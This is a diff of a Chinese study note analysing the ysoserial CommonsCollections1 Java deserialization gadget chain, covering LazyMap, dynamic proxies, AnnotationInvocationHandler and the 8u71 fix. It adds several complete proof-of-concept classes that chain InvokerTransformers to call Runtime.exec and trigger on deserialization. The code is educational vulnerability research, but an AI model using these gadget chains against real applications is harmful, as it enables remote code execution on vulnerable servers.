@@ -748,50 +748,421 @@ innerMap.put("value", "xxxx");
 
 #### ysoserial的利用链分析
 
-这里先给出ysoserial构造的poc，ysoserial的代码将一些操作封装成了函数，为了方便分析，我这里将它们展开
+这里先给出ysoserial构造的poc，ysoserial的代码将一些操作封装成了函数，为了方便分析，这里贴出它们展开后的代码
 
 ```java
-public InvocationHandler getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
-		// inert chain for setup
-		final Transformer transformerChain = new ChainedTransformer(
-			new Transformer[]{ new ConstantTransformer(1) });
-		// real chain for after setup
-		final Transformer[] transformers = new Transformer[] {
-				new ConstantTransformer(Runtime.class),
-				new InvokerTransformer("getMethod", new Class[] {
-					String.class, Class[].class }, new Object[] {
-					"getRuntime", new Class[0] }),
-				new InvokerTransformer("invoke", new Class[] {
-					Object.class, Object[].class }, new Object[] {
-					null, new Object[0] }),
-				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
-				new ConstantTransformer(1) };
-
-		final Map innerMap = new HashMap();
-
-		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-
-		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-
-		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
-
-		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
-
-		return handler;
-	}
+public class YsoCC1 {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class,
+                        Class[].class }, new Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class,
+                        Object[].class }, new Object[] { null, new
+                        Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class
+                },
+                        new String[] { "calc.exe" }),
+        };
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class,
+                Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)
+                construct.newInstance(Retention.class, outerMap);
+        Map proxyMap = (Map)
+                Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},
+                        handler);
+        handler = (InvocationHandler)
+                construct.newInstance(Retention.class, proxyMap);
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(handler);
+        oos.close();
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new
+                ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
 ```
 
-这与我们之前的poc代码有一些不同，主要是三点：
+这与我们之前的poc代码有一些不同，主要是两点：
 
-* 之前的poc代码中，` Transformer transformerChain = new ChainedTransformer(transformers);`，在利用链条上，transformerChain遍历调用transformers数组的transform方法，触发了漏洞。但是此处的poc没有将transformers作为new ChainedTransformer的参数传入，那么`Reflections.setFieldValue(transformerChain, "iTransformers", transformers);`是否能起到类似的效果，如果可以，为什么要这么构造？
 * 没有发现我们熟悉的`TransformedMap.decorate`，而有一个`LazyMap.decorate`
-* 没有使用反射获取`AnnotationInvocationHandler`，而是增加了一些其他操作
+* 多了两行代码` Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);`
 
 让我们一点一点来分析
 
-##### 问题1
+##### LazyMap如何代替TransformedMap触发漏洞
+
+```java
+// LazyMap.decorate(innerMap, transformerChain);返回的对象
+public static Map decorate(Map map, Transformer factory) {
+        return new LazyMap(map, factory);
+}
+
+protected LazyMap(Map map, Transformer factory) {
+        super(map);
+        if (factory == null) {
+            throw new IllegalArgumentException("Factory must not be null");
+        }
+        this.factory = factory;
+
+```
+
+注意到这个类的get方法，传入的key不存在时，其会调用Transfomer类的transform方法。
+
+```java
+public Object get(Object key) {
+    // create value for key if key is not currently in the map
+    if (map.containsKey(key) == false) {
+        Object value = factory.transform(key);
+        map.put(key, value);
+        return value;
+    }
+    return map.get(key);
+}
+```
+
+但是会根据前面分析的AnnotationInvacationHandler的readObject方法可知，其并没有调用到Map的get方法，查看AnnotationInvocationHandler的invoke方法，发现其调用了Map的get
+
+```java
+    public Object invoke(Object proxy, Method method, Object[] args) {
+        String member = method.getName();
+        Class<?>[] paramTypes = method.getParameterTypes();
+
+        // Handle Object and Annotation methods
+        if (member.equals("equals") && paramTypes.length == 1 &&
+            paramTypes[0] == Object.class)
+            return equalsImpl(args[0]);
+        if (paramTypes.length != 0)
+            throw new AssertionError("Too many parameters for an annotation method");
+
+        switch(member) {
+        case "toString":
+            return toStringImpl();
+        case "hashCode":
+            return hashCodeImpl();
+        case "annotationType":
+            return type;
+        }
+
+        // Handle annotation member accessors
+        Object result = memberValues.get(member);
+
+        if (result == null)
+            throw new IncompleteAnnotationException(type, member);
+
+        if (result instanceof ExceptionProxy)
+            throw ((ExceptionProxy) result).generateException();
+
+        if (result.getClass().isArray() && Array.getLength(result) != 0)
+            result = cloneArray(result);
+
+        return result;
+    }
+```
+
+##### AnnotationInvocationHandler#invoke的特殊性
+
+java是一门静态语言，相比于PHP、Python等动态语言，它的灵活性不足，不允许动态添加新代码、修改现有代码或删除代码，但是依靠动态代理，java可以实现动态调用代码。
+
+```php
+class MyClass
+{
+    private $data = array();
+
+    public function __call($name, $arguments)
+    {
+        // 检查方法名是否以 "get" 或 "set" 开头
+        if (substr($name, 0, 3) == 'get') {
+            $key = substr($name, 3);
+            return $this->data[$key];
+        } elseif (substr($name, 0, 3) == 'set') {
+            $key = substr($name, 3);
+            $this->data[$key] = $arguments[0];
+            return $this;
+        } else {
+            throw new Exception("Undefined method '$name'");
+        }
+    }
+}
+
+$obj = new MyClass();
+$obj->setName('John Doe');
+echo $obj->getName(); // Output: John Doe
+```
+
+这段PHP代码演示了`__call`魔术方法的作用，通过该方法可以动态的调用方法。而在Java中，动态代理也可以起到类似的作用，动态代理是一种设计模式，它允许在运行时创建代理对象，以便在方法调用前后添加额外的逻辑，比如日志记录、事务管理和权限控制等。Java 的动态代理机制主要依赖于 `java.lang.reflect.Proxy` 类和 `java.lang.reflect.InvocationHandler` 接口：
+
+1. `java.lang.reflect.Proxy`
+
+`Proxy` 类提供了用于创建动态代理类和实例的静态方法。
+
+2. `java.lang.reflect.InvocationHandler`
+
+`InvocationHandler` 接口定义了 `invoke` 方法，用于在代理实例上处理方法调用。
+
+下面是简单的示例代码
+
+```java
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.util.Map;
+public class ExampleInvocationHandler implements InvocationHandler {
+    protected Map map;
+    public ExampleInvocationHandler(Map map) {
+        this.map = map;
+    }
+    @Override
+    public Object invoke(Object proxy, Method method, Object[] args) throws
+            Throwable {
+        if (method.getName().compareTo("get") == 0) {
+            System.out.println("Hook method: " + method.getName());
+            return "Hacked Object";
+        }
+        return method.invoke(this.map, args);
+    }
+}
+```
+
+ExampleInvocationHandler实现了Invocationhandler的invoke方法，作用是在监控调用的方法名是get的时候，返回一 个特殊字符串 Hacked Object 。
+
+```java
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+public class App {
+    public static void main(String[] args) throws Exception {
+        
+        // Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻辑。
+        Map proxyMap = (Map)
+                Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},
+                        handler);
+        proxyMap.put("hello", "world");
+        String result = (String) proxyMap.get("hello");
+        System.out.println(result);
+    }
+}
+```
+
+运行App类，发现`String result = (String) proxyMap.get("hello");`获取的字符串不是 “world”而是"Hacked Object"。
+
+##### 利用AnnotationInvocationHandler#invoke触发漏洞
+
+由于AnnotationInvocationHandler实现了InvocationHandler接口，而且刚好其invoke方法中有对Map的put操作，可以触发漏洞，所以我们通过动态代理LazyMap，让AnnotationInvocationHandler#invoke作为LazyMap的动态代理处理器，当任意的代码调用LazyMap的任意方法时，动态代理将拦截该方法并调用AnnotationInvocationHandler#invoke，从而触发漏洞。
+
+```java
+// ......
+Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
+construct.setAccessible(true);
+InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
+Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
+// 这几行代码，类似于示例中的InvocationHandler handler = new ExampleInvocationHandler(new HashMap());Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
+// 创建了代理实例，这里不是AnnotationInvocationHandler也可以，可以是任何实现了InvocationHandler、接口且在invoke方法中调用了Map.get的类，示例代码见附录代码片段1
+
+handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
+// 代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹，也可以不使用AnnotationInvocationHandler，任何在构造函数可以传入proxyMap且readObject中调用proxyMap的方法的类都可以，示例代码见附录代码片段2
+```
+
+我们再回头看AnnotationInvocationHandler的readObject方法，这里的memberValues即是LazyMap，其调用entrySet方法被动态代理拦截
+
+![image-20240712140244668](./images/image-20240712140244668.png)
+
+#### 有关ysoserial的其他问题
+
+* 
+
+#### LazyMap在8u71以后仍不能利用
+
+前面分析过，在8u71以后，CC1无法发挥作用的原因之一是不再直接 使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，原来Map的键值对也通过fields.get获取
+
+```diff
++        ObjectInputStream.GetField fields = s.readFields();
++
++        @SuppressWarnings("unchecked")
++        Class<? extends Annotation> t = (Class<? extends Annotation>)fields.get("type", null);
++        @SuppressWarnings("unchecked")
++        Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);
+```
+
+我们精心构造的Map不再执行一些操作，自然也不会触发漏洞。对于才有LazyMap的CC1来说，其触发需要对精心构造的Map调用任意方法，这里没有调用原来Map的任何方法，自然不会触发漏洞。
+
+### 附录
+
+#### 代码片段
+
+代码1
+
+```java
+// 动态代理处理器
+import java.io.Serializable;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+import java.util.Map;
+
+public class LazyMapInvocationHandler implements InvocationHandler, Serializable {
+    protected Map map;
+    public LazyMapInvocationHandler(Map map) {
+        this.map = map;
+    }
+    @Override
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        map.get("test");
+        return null;
+    }
+}
 
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
 
+public class YsoCC1ChangeProxy {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class,
+                        Class[].class }, new Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class,
+                        Object[].class }, new Object[] { null, new
+                        Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class
+                },
+                        new String[] { "calc.exe" }),
+        };
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class,
+                Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = new LazyMapInvocationHandler(outerMap);
+        Map proxyMap = (Map)
+                Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},
+                        handler);
+        handler = (InvocationHandler)
+                construct.newInstance(Retention.class, proxyMap);
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(handler);
+        oos.close();
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new
+                ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
+```
+
+代码2
+
+```java
+// readObject为入口点
+import java.io.IOException;
+import java.io.Serializable;
+import java.util.Map;
+
+public class EntryPoint implements Serializable {
+    protected Map map;
+    public EntryPoint(Map map){
+        this.map = map;
+    }
+    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
+        s.defaultReadObject();
+        System.out.println(map.values());
+    }
+}
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.annotation.Retention;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+
+public class YsoCC1ChangeEntryPoint {
+    public static void main(String[] args) throws Exception {
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[] {
+                        String.class,
+                        Class[].class }, new Object[] { "getRuntime",
+                        new Class[0] }),
+                new InvokerTransformer("invoke", new Class[] {
+                        Object.class,
+                        Object[].class }, new Object[] { null, new
+                        Object[0] }),
+                new InvokerTransformer("exec", new Class[] { String.class
+                },
+                        new String[] { "calc.exe" }),
+        };
+        Transformer transformerChain = new
+                ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
+        Class clazz =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor construct = clazz.getDeclaredConstructor(Class.class,
+                Map.class);
+        construct.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler)
+                construct.newInstance(Retention.class, outerMap);
+        Map proxyMap = (Map)
+                Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},
+                        handler);
+        EntryPoint entryPoint = new EntryPoint(proxyMap);
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(entryPoint);
+        oos.close();
+        System.out.println(barr);
+        ObjectInputStream ois = new ObjectInputStream(new
+                ByteArrayInputStream(barr.toByteArray()));
+        Object o = (Object)ois.readObject();
+    }
+}
+```
+
+#### 关于ysoserial的一些其他操作
+
+* 我们的poc在调试时可能弹出多个计算机，在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所 以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了命令。ysoserial对此有一些处理，它在POC的最后才将执行命令的Transformer数组设置到transformerChain 中，原因是避免本地生成序列化流的程序执行到命令。
+* ysoserial中的Transformer数组，为什么最后会增加一个 ConstantTransformer(1)：可能是为了隐藏异常日志中的一些信息。如果这里没有 ConstantTransformer，命令进程对象将会被 LazyMap#get 返回，导致我们在异常信息里能看到ProcessImpl的特征
+
+#### 参考资料
+
+* 
